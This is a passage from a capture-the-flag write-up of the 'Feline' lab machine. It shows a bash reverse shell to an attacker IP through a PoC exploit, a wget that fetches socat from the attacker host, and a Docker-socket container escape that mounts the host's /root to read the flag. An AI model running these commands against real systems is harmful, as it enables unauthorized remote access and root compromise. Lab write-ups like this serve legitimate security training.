netcat to listen to our attempts.</p><pre id="c7e49d3f-f70e-4c9d-8e75-9f4f2a518f7e" class="code"><code>└─$ nc -lnvp 4444</code></pre><p id="8b98a19e-d841-4b5e-a12a-87e313f31f80" class="">Finally when the connection is setup we can now run our astonishing reverse shell command!</p><pre id="f98ba40d-5205-44d5-9f78-dc0f94a29d01" class="code"><code>└─$ python3 exploit1.py --exec &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.177/4444 0&gt;&amp;1&quot;&#x27;</code></pre><p id="58785af6-4af9-497e-8928-62fe466dfb7e" class="">   <mark class="highlight-gray"> * exploit1.py is the PoC code!</mark></p><figure id="b63d03fd-d476-4365-8cbc-1cf8e3125474" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2012.png"><img style="width:958px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2012.png"/></a></figure><p id="adb196ab-a84a-4014-ab97-f7b343bedff3" class="">Now if we did everything right we might have got a <mark class="highlight-purple">root shell</mark>.</p><figure id="8714fc8b-1476-449d-8070-a832afe960c0" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2013.png"><img style="width:723px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2013.png"/></a></figure><p id="2b372345-2e9d-486a-84c7-addae41b25a4" class="">However this root is a bit odd! With a bit of research we see that we&#x27;re now the root user in a docker container!
+Exploring the files in the root folder we see that it&#x27;s possible to read the root&#x27;s bash history!</p><pre id="7fff826e-e4f0-432a-b998-d6ce1e491422" class="code"><code>└─$ cat ./.bash_history</code></pre><p id="f0f974b0-2962-40d8-9fed-47f4ff255b7d" class="">Doing it we find some interesting bit of command, one that uses docker socket.</p><pre id="b673ff17-17e3-484b-a735-a31e1d0a1f06" class="code"><code>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json</code></pre><p id="f365c67c-fc62-4ea1-b136-0a0705d2f594" class="">We will need to scape this container if we want to get the so desired root flag!</p><p id="f9808c18-c0a0-404e-b024-6d96f32552dc" class="">
+Searching for ways to scape the docker container that uses docker socket we end up finding an amazing resource:
+<a href="https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html"><mark class="highlight-red">https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</mark></a></p><figure id="e562a0c5-de5a-4ece-b997-b6c1fdf804a8" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2014.png"><img style="width:829px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2014.png"/></a></figure><pre id="c7dfce0d-c219-4c48-994a-0a478a0d5b0a" class="code"><code>curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json</code></pre><p id="d3c63051-3bb4-4071-8506-7a710cf51de1" class="">We see that in our case the image name is: <mark class="highlight-red">188a2704d8b0</mark></p><figure id="bceca516-d87d-4865-975c-1319181a4ee1" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2015.png"><img style="width:1920px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2015.png"/></a></figure><figure id="e5f69507-54b1-4914-8556-d89bf97148d4" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2016.png"><img style="width:846px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2016.png"/></a></figure><p id="75aeab32-9832-416a-90ae-3ba916b39a49" class="">In our case we can run the command as the following, modifying the source for root and image as previously said:</p><pre id="edac33da-391e-43ba-8977-1e8b90fae827" class="code"><code>└─$ echo -e &#x27;{&quot;Image&quot;:&quot;188a2704d8b0&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;],&quot;DetachKeys&quot;:&quot;Ctrl-p,Ctrl-q&quot;,&quot;OpenStdin&quot;:true,&quot;Mounts&quot;:[{&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root/&quot;,&quot;Target&quot;:&quot;/host_root&quot;}]}&#x27; &gt; container.json
+└─$ curl -XPOST -H &quot;Content-Type: application/json&quot; --unix-socket /var/run/docker.sock -d &quot;$(cat container.json)&quot; http://localhost/containers/create</code></pre><p id="457a87a4-9e8c-4219-989f-a7a4b9cfe6b1" class="">It returns us:</p><figure id="db196dbe-3c26-4e83-8509-19e1e8059bc3" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2017.png"><img style="width:1865px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2017.png"/></a></figure><pre id="0b9b5ae0-733b-403f-bffb-903646fbf5a1" class="code"><code>└─$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/ab1a/start</code></pre><figure id="19beef98-edc7-497a-b54b-30f5fcb7fef0" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2018.png"><img style="width:1205px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2018.png"/></a></figure><p id="edd023c9-4fdc-4e8a-a23a-bfe174534dcc" class="">We notice that to continue with the PoC we need <mark class="highlight-teal">Socat</mark> and the machine doesn&#x27;t have so we need to download it from our machine:</p><pre id="e3282bc5-0245-4dc6-addd-6bb1604c1ef5" class="code"><code>└─$ wget http://10.10.14.177/socat; chmod +x ./socat</code></pre><figure id="01d21adc-ae00-4639-b4b3-933100e98889" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2019.png"><img style="width:1086px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2019.png"/></a></figure><pre id="c73d6fd2-04de-4c03-96a8-89968fddb089" class="code"><code>└─$ ./socat - UNIX-CONNECT:/var/run/docker.sock</code></pre><pre id="8118d361-7a40-480c-b064-45e64554a730" class="code"><code>POST /containers/ab1a/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+Host:
+Connection: Upgrade
+Upgrade: tcp</code></pre><figure id="7d55cf0b-17f9-49bc-86fd-107009b65167" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2020.png"><img style="width:868px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2020.png"/></a></figure><p id="caf9ee01-7f62-4aec-afd7-eddb6cd894de" class="">Following all the steps and modifying all the parts needed we&#x27;re able to create a new docker container that contains the <mark class="highlight-brown">/root</mark> folder from our real Feline machine as source.
+Reading the real /root folder we are able to find our so long awaited root.txt, our flag!</p><p id="4c22ec3c-b4b8-4b4c-9404-35c21f288f62" class="">
+</p></div></article><body style="background-color: #303336; color: white;"></body></html>
